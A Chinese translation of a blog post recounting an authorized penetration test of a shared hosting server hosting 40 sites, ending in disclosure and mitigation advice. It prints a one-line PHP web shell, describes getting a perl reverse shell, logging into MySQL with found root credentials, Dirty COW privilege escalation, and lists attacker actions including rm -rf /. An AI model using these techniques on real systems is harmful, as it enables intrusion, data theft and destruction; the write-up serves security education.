# 我如何在 7 分钟内黑了 40 个网站

> 原文：<https://medium.com/hackernoon/how-i-hacked-40-websites-in-7-minutes-5b4c28bc8824>

![](img/7b404152d3542b969ec07bfba2853bb3.png)

去年夏天，我开始学习信息安全和黑客技术。在过去的一年里，我玩了各种战争游戏，捕捉旗帜和渗透测试模拟，不断提高我的黑客技能，学习关于“如何让计算机偏离预期行为”的新知识。

长话短说，我的经历总是局限于模拟环境，自从我认为自己是一个白帽黑客(又名好人之一)以来，我从来没有干涉过其他人的事情——完全是真的。

直到现在。这将是一个详细的故事，关于我如何侵入一个服务器，托管 40 个(这是一个确切的数字)网站和我的发现。

> **注意:**要理解文章的技术部分，需要具备一些 CS 知识。

一个朋友发消息给我说，在他的网站上发现了一个 [XSS 漏洞](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))，他想让我进一步查看。这是一个重要的阶段，因为我倾向于要求他正式表示我得到了他的许可，可以在他的 web 应用程序和托管它的服务器上执行完整的测试。答案是肯定的。

![](img/f248ba457359ff154d9145416c0e9127.png)

> 在这篇文章的剩余部分，我将把我朋友的网站称为**http://example.com**

第一步总是列举并找到尽可能多的关于你的敌人的信息——同时尽量少惊吓他们。

在这个阶段，我们触发计时器并开始扫描。

```
$ nmap --top-ports 1000 -T4 -sC [http://example.com](http://victim.com)
Nmap scan report for example.com {redacted}
Host is up (0.077s latency).
rDNS record for {redacted}: {redacted}
Not shown: 972 filtered ports
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
| ssh-hostkey: 
|   {redacted}
80/tcp    open   http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Victim Site
139/tcp   open   netbios-ssn
443/tcp   open   https
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_{redacted}
445/tcp   open   microsoft-ds
5901/tcp  open   vnc-1
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    VNC Authentication (2)
8080/tcp  open   http-proxy
|_http-title: 400 Bad Request
8081/tcp  open   blackice-icecap
```

> 扫描在大约 2 分钟内完成。

开放的港口真多啊！通过观察 [FTP](https://en.wikipedia.org/wiki/File_Transfer_Protocol) (端口 21)和 SMB(端口 139/445)端口是打开的，我们可以猜测该服务器用于文件托管和文件共享，同时它是一个 web 服务器(端口 80/443 和 8080/8081 处的代理)。

![](img/c7cecafc9dad4f9ab94833e0300662ae.png)

From The Art of War. Enumerating is key.

如果上述扫描的信息不够，可以考虑进行 UDP 端口扫描并扫描超过前 1000 个端口。唯一允许我们与之交互的端口(没有凭证)是端口 80/443。

为了不浪费任何时间，我启动了`gobuster`来枚举 web 服务器上任何感兴趣的文件，同时我将手动挖掘信息。

```
$ gobuster -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100/admin
/login
```

原来/admin 路径是一个“管理工具”,它允许经过验证的用户修改 web 服务器上的内容。这需要凭证，因为我们既没有用户名也没有密码，我们继续前进。(剧透:gobuster 没有发现任何有价值的东西)

> 到目前为止，我们已经进行了 3 分钟。还没有什么有用的。

浏览网站时，我们看到它要求我们登录。没问题，我们用一个[假邮件](http://www.fakemailgenerator.com)创建一个账户，点击确认邮件，几秒钟后登录。

该网站欢迎我们，并提示我们导航到我们的个人资料，并更新我们的个人资料图片。多好啊。

看到这个网站看起来是定制的，我倾向于测试一个[无限制文件上传](https://www.owasp.org/index.php/Unrestricted_File_Upload)漏洞。在我的终端上，我执行:

```
echo "<?php system(\$_GET['cmd']); ?>" > exploit.php
```

我试着上传“图像”,然后就好了！上传者允许*exploit.php*文件被上传。当然，它没有缩略图，但这意味着我的文件被上传到了某个地方。

![](img/56c1686f8c021f04075a88e91a2f61d0.png)

Get the exploit’s location

在这里，我们希望上传者对上传的文件进行某种处理，检查其文件扩展名，并替换为已接受的文件扩展名，如。jpeg，。jpg，以避免攻击者上传恶意代码远程执行代码，就像你的一样。

人们毕竟关心安全。

对吗？对吗？…对吗？

```
`Copy image address` results in the following url being copied to our clipboard:
http://www.example.com/admin/ftp/objects/XXXXXXXXXXXX.php
```

看起来我们已经准备好了 webshell，并且正在运行:

![](img/bace052397c11686e397f4e9b59507d3.png)

看到 web 服务器运行 **perl** 脚本(真的，perl？)我们从我们最喜欢的 [cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 中抓取一个 perl reverse shell，设置 IP/Port，然后我们得到一个低特权 shell——抱歉，没有截图。

> 大约 5 分钟，我们已经有了一个低特权外壳。

令我惊讶的是，服务器上并不是只有一个网站，而是有 40 个不同的网站。遗憾的是，我没有保存每个细节的截图，但是输出大致如下:

```
$ ls /var/wwwaccess.log site1/ site2/ site3/ {... the list goes on}
```

你明白了。令人惊讶的是，所有托管网站的读取权限都是可用的，这意味着我可以读取所有网站的后端代码。我把自己局限于 example.com 的代码。

值得注意的是，在`cgi-admin/pages`目录中，所有的 perl 脚本都以 root 的身份连接到 mysql 数据库**。数据库的凭证以明文形式存在。让这些成为 *root:pwned42***

果然，服务器正在运行 MariaDB，我不得不求助于这个[问题](https://github.com/dockerfile/mariadb/issues/3)才能访问数据库。之后，我们执行:

```
mysql -u root -p -h localhost victimdbname
Password: pwned42
```

我们在数据库里有根权限。

![](img/2a630a19b83aba6ac78b1e3f986361e4.png)

“use databasename;” allows us to access any of the 35 databases and view & modify their contents

> 仅仅 7 分钟后，我们就拥有了对**35(！idspnonenote)内容的完全读/写权限。)数据库**

在这里，我在道义上有义务停下来，公开我迄今为止的发现。潜在的损害已经很大了。

## 攻击者可以做什么:

1.  转储所有数据库的内容，如这里[所述](https://stackoverflow.com/questions/9497869/export-and-import-all-mysql-databases-at-one-time)，导致所有 35 家公司的数据泄露到公共领域。
2.  删除所有数据库，有效地删除 35 家公司的数据
3.  为持久访问留下一个后门，如 apache 和 cronjob，如这里的[所述](http://blog.tobiasforkel.de/en/2015/03/19/setup-cron-job-for-apache-user/)，以防他们想要返回。

我应该注意到 mysql 进程是以 root 用户身份运行的，所以我想我应该尝试执行`\! whoami`来获得 root 用户。不幸的是，我仍然是阿帕奇人。

> 该休息一下了。停止计时。

# 还有什么会进一步出错？

在披露了我的发现后，我得到了进一步的许可去深入挖掘。

在想办法将我的权限提升到 root 并能够造成巨大的潜在损害之前，我在考虑我的受限用户可以阅读哪些其他有趣的文件。

此时，我想起了开放的 SMB 端口。这意味着在系统中的某个地方应该有一些用户共享的文件夹。简单列举之后，目录`/home/samba/secured` 中出现以下内容(请原谅我的大量审查):

![](img/8108ae751877d26312ac59fb06e3d0b4.png)

在所有这些目录中，有每个托管公司用户的文件。其中包括各种敏感数据:

*   。psd/。人工智能文件(设计师知道保持这些私密性有多重要，毕竟这是他们的工作和技术)
*   Cookie sqlite 文件
*   发票
*   盗版电子书(看到这个忍俊不禁)
*   【WiFi SSIDS 的凭证

## 攻击者可以做什么:

1.  在公司办公室外扎营，登录他们的内部网，在本地网络上进行各种有趣的攻击
2.  将上面列出的所有敏感数据转储到公共领域

> 我花了一些时间浏览这些文件夹，才意识到这个问题有多严重。
> 再来一次休息。

# 最后一击

在作为 Apache*看了一会儿之后，我决定是时候钓大鱼了，唉，获得 root 权限。我查阅了一本流行的[备忘单](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)，开始列举系统中有趣的文件。*

由于我的挖掘，到目前为止，我已经经历了这些技术的大部分，似乎不能找到一些会增加我的立足点。

这时候我突然想到。在我经常玩的“捕捉旗帜”挑战中，操作系统通常会打补丁，这是一些故意配置错误的服务，最终会给你提供受欢迎的 root 权限。然而在现实世界中，人们并不打补丁。

> 我的意思是，看看 Equifax *(无法抗拒)。*

服务器运行的是什么样的 Linux？

```
$ cat /etc/issue
CentOS Linux release 7.2.1511 (Core)
```

内核是什么版本？

![](img/b5a34c6efd0059ec3957bb4077261406.png)

这看起来像一个旧的内核版本。

![](img/792997a6e123d111d375853a69cf9502.png)

Does this remind you of something? If not, have a read [here](https://www.theguardian.com/technology/2016/oct/21/dirty-cow-linux-vulnerability-found-after-nine-years) (hint: it is VERY serious)

我找到了[这篇](http://davemacaulay.com/easily-test-dirty-cow-cve-2016-5195-vulnerability/)博文，它让我用这里找到的脚本来测试内核是否易受攻击。

![](img/ab4adf8bf8a46a9295fe9a37df014d99.png)

Timestamps & Firefox restored sites redacted

其次是:

![](img/b1407c3722c4f016bb1040999d960ee0.png)

## 游戏结束。

我立即写了一封电子邮件，充分披露了上述每一步的细节和潜在影响，然后结束了这个夜晚。咻。

## 攻击者可以做什么:

1.  读取/修改服务器上的所有文件
2.  留下一个持久的后门(就像 apache 一样)
3.  安装恶意软件并可能将恶意软件传播到服务器的内部网
4.  安装勒索软件(劫持 35 家公司的数据库和所有托管公司的数据可不是小事)
5.  将服务器用作加密货币矿工
6.  将服务器用作代理
7.  将服务器用作 C2C 服务器
8.  将服务器用作僵尸网络的一部分
9.  …(发挥你的想象力)
10.  **rm -rf /** (不是开玩笑)

第二天，我的朋友(他联系了运营服务器的公司)联系了我，并告知我文件上传程序中的错误已经修复。

# TL；博士；医生

总而言之，我们发现:

1.  一个 web 应用程序有一个不受限的文件上传漏洞，导致进入低权限外壳。
2.  mysql 数据库的凭证，这导致对 35 个数据库的读/写访问
3.  大量可读的敏感文件

最后，我们滥用一个未打补丁的内核来获取 root 访问权限。

# 缓解措施—建议

让我们从给我们最初立足点的上传者开始。由于整个 web 应用程序的后端都是用 perl 编写的——而且我不会说 perl——我真的不能给出修复的建议。

我建议的一个解决办法是在 2017 年不使用 perl，但这只是我的观点，请随意证明我是错的。

关于文件系统，我建议根据最小特权原则为用户分配适当的文件权限。这样，即使像 apache 这样的低特权用户可以访问，他们也不能读取任何敏感文件。

在同一个服务器上运行所有的网站是一个坏主意，我不确定一个文档化的方法是否能解决这个问题。

对所有数据库使用相同的凭证肯定不是一个好主意。

> 单点故障通常不太好。

最后，**修补一切**。这是字面上的 1 个命令:`**su -c 'yum update'**` (具体 CentOS)

## 感谢你的阅读和坚持到这里，抱歉写了这么长的帖子。我想彻底，这是一个严重的情况😄

## 如果你喜欢，就把那个按钮砸 50 次！

## 无耻的插头

![](img/07e646106884f15009a889ff2d2574cb.png)

我是一名来自希腊的电子和计算机工程专业的五年级学生。我对信息安全、现代商业中的区块链研究和应用以及自动驾驶汽车感兴趣。了解更多我在 gakonst.com[做的事情](https://gakonst.com)

如果你喜欢这篇文章的内容，并想了解我的最新作品，请在 [Medium](/@gakonst) 和 [Twitter](https://twitter.com/gakonst) 上关注我